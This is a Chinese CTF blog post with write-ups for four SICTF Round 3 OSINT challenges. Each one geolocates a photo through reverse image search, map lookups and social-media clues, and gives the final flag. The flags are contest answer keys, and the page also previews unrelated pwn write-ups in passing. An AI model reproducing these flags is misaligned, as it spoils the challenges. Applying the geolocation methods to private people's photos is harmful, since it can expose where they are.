<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220203-ny8suja.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220203-ny8suja.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220203-aw3c3lk.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220203-aw3c3lk.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="树木的压迫"><span class="me-2">树木的压迫</span><a href="#树木的压迫" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>1.百度搜图定位到达州凤凰山，放大图片很明显可以看出是一个体育场</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220225-xl90ywf.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220225-xl90ywf.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220225-08biaic.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220225-08biaic.gif" alt="" loading="lazy"></a>​</p>

<p>2.百度地图直接搜索达州体育就能冒出来达州市体育中心</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220225-l1u4k08.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220225-l1u4k08.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>查看相册确定就是这个地方</li>
</ol>

<pre><code class="language-flag">SICTF{四川省_达州市_通川区_凤凰大道376号_达州市体育中心}
</code></pre>

<p>‍</p>

<p>‍</p>

<h3 id="真的签到"><span class="me-2">真的签到</span><a href="#真的签到" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>百度搜图和谷歌搜图都搜不到，使用抖音识图，发现第一个视频就是后面的摩天轮和商场的外观极度相似</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220350-7sfe7w9.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220350-7sfe7w9.jpg" alt="07f0b9d3f01b121bac61c4debb67dfa" loading="lazy"></a>​</p>

<ol>
  <li>现在需要确定是那个城市点开这个视频发现评论区的IP全部都是广东的</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220350-yv2vh0m.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220350-yv2vh0m.jpg" alt="b664a79c3267ce85fd91ab9e4046574" loading="lazy"></a>​</p>

<p>3.根据作者的留言井岸大信摩天轮尝试搜索定位到海珠之星摩天轮并且就在大信新都汇旁边</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220350-g4i836g.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220350-g4i836g.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220350-ax8us27.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220350-ax8us27.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>SICTF{广东省_珠海市_斗门区_大信新都汇}</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220350-e6wr6p0.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220350-e6wr6p0.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="这才是签到"><span class="me-2">这才是签到</span><a href="#这才是签到" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>谷歌识图可知国家是在意大利威尼斯</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220428-4oskdsw.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220428-4oskdsw.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>使用意大利威尼斯达涅利酒店谷歌地图搜索发现拍摄地点应该为Gondola Danieli</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220428-vp0r8ts.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220428-vp0r8ts.jpg" alt="" loading="lazy"></a>​</p>

<ol>
  <li>根据聊天记录可知，你再走过小道就找到我了得到最后的结果为 ChiesadiSanZaccaria</li>
</ol>

<p>最后的结果就是SICTF{意大利_威尼斯_GondolaDanieli_ChiesadiSanZaccaria}</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220428-nnvaebj.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220428-nnvaebj.jpg" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="签退"><span class="me-2">签退</span><a href="#签退" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>1.谷歌识图发现有一个B站的视频点进去看看发现红绿灯和图片上的一模一样并且视频中也有很多那种白色且窗户很多的大楼暂且定位为南非开普敦</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220455-9c8jyui.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220455-9c8jyui.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220455-tjwhgjo.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220455-tjwhgjo.gif" alt="" loading="lazy"></a>​</p>

<p>2.观察图片发现有一个类似于蜘蛛网的东西，并且马赛克还有红色的部分，可以联想到蜘蛛侠</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220455-icv29hf.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220455-icv29hf.jpg" alt="" loading="lazy"></a>​</p>

<ol>
  <li>搜索 cape town spider man第一个链接发现一个视频在视频中发现了一样的红绿灯和大楼并且发现一个店铺的名称 STEERS 和给的图片中的店铺后面几个字母一样</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220455-pdfa2x5.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220455-pdfa2x5.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219220455-14zj5vc.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219220455-14zj5vc.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>谷歌地图搜索开普敦 STEERS几个店铺一个一个看最终确定到这里最终的flag为 SICTF{南非_开普敦_StrandSt_STEERS}</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219220455-mgdpcqw.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219220455-mgdpcqw.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219220455-7ydv5xb.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219220455-7ydv5xb.jpg" alt="" loading="lazy"></a>​</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSICTF-Round-3-WriteUps_by_AhiSec%2F&title=2024-SICTF%20Round#3-WriteUps_by_AhiSec%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=2024-SICTF%20Round#3-WriteUps_by_AhiSec%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSICTF-Round-3-WriteUps_by_AhiSec%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSICTF-Round-3-WriteUps_by_AhiSec%2F&text=2024-SICTF%20Round#3-WriteUps_by_AhiSec%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/PHP-So-Pwn/">2024-05-31-PHP-So-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/GCC-CTF/">2024-03-05-GCC-CTF-Pwn_Writeups</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/SICTF-Round-3-WriteUps_by_AhiSec/">2024-SICTF Round#3-WriteUps_by_AhiSec</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Announcements/">Announcements</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/">2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">相关文章</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700395200"
  data-df="YYYY/MM/DD"
  
>
  2023/11/19
</time>

              <h4 class="pt-0 my-2">2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps</h4>
              <div class="text-muted">
                <p>
                  





                  ‍
‍

‍

pwn-pwn0402

‍

​​​​

‍


  我们采用溢出后再次read  然后写shellcode 在栈上ret


‍

​​

‍

​​

from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700481600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/20
</time>

              <h4 class="pt-0 my-2">2023香山杯决赛Pwn-分析</h4>
              <div class="text-muted">
                <p>
                  





                  
  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。


camera

‍

程序分析

‍

​​

‍

根据程序的功能然后加上一些手法，可以double free

后面就是填满 tcachebins 然后 fastbin double free 就好了

‍

​​

‍

‍

cat 用的顺手了，我就直接用 cat  ORW 就好了

​...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700913600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/25
</time>

              <h4 class="pt-0 my-2">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</h4>
              <div class="text-muted">
                <p>
                  





                  ‍

‍
DASCTF X CBCTF 2023｜无畏者先行

‍

‍

Pwn-ASadStory

‍


  保护


​​


  沙箱


​​

‍


  exploit


from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data     ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps</p>
    </a>
  

  
    <a
      href="/posts/GCC-CTF/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>2024-03-05-GCC-CTF-Pwn_Writeups</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2024</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

